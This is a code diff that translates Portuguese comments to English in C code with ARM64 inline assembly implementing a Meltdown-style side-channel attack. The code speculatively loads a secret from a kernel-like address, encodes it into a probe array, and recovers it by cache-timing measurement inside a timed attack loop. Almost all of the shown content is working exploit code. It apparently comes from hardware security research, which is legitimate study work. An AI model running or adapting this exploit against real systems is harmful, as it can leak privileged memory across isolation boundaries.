@@ -18,11 +18,11 @@ void *kernel_address = &secret_data;
 void try_meltdown_read(void *addr) {
   unsigned long val;
 
-  asm volatile("ldr %0, [%1]\n\t"      // Tenta carregar o segredo
-               "lsl %0, %0, #12\n\t"   // Multiplica por 4096
-               "ldr x2, [%2, %0]\n\t"  // Acessa array2[segredo * 4096]
-               : "=&r"(val)            // Saída
-               : "r"(addr), "r"(array) // Entradas
+  asm volatile("ldr %0, [%1]\n\t"      // Try to load the secret
+               "lsl %0, %0, #12\n\t"   // Multiply by 4096
+               "ldr x2, [%2, %0]\n\t"  // Access array2[secret * 4096]
+               : "=&r"(val)            // Output
+               : "r"(addr), "r"(array) // Inputs
                : "x2", "memory"        // Clobbers
   );
 }
@@ -34,10 +34,10 @@ int measure_cache_meltdown(int threshold) {
 
   for (int i = 0; i < 256; i++) {
     int mix_i =
-        ((i * 167) + 13) & 255; // Embaralha para evitar stride prediction
-    addr = &array[mix_i * 512]; // Usando stride 512 do seu código spectre
+        ((i * 167) + 13) & 255; // Shuffle to avoid stride prediction
+    addr = &array[mix_i * 512]; // Using stride 512 from the spectre code
 
-    // Mede tempo de acesso
+    // Measure access time
     asm volatile("isb \n mrs %0, cntvct_el0" : "=r"(start));
     volatile uint8_t junk = *addr;
     asm volatile("isb \n mrs %0, cntvct_el0" : "=r"(end));
@@ -53,11 +53,11 @@ void execute_meltdown_attack(int cache_hit_threshold, uint32_t duration_ms) {
   uint64_t start_time = get_hardware_timer_count();
   uint64_t timer_freq = get_hardware_timer_freq();
 
-  // Converte os milissegundos desejados para ciclos do hardware
+  // Convert desired milliseconds to hardware ticks
   uint64_t duration_hardware_ticks = (timer_freq / 1000) * duration_ms;
   uint64_t end_attack_time = start_time + duration_hardware_ticks;
 
-  // Loop de ataque rodando 100% no hardware puro, sem RTOS
+  // Attack loop running 100% on bare hardware, no RTOS
   while (get_hardware_timer_count() < end_attack_time) {
 
     for (int i = 0; i < 256; i++) {
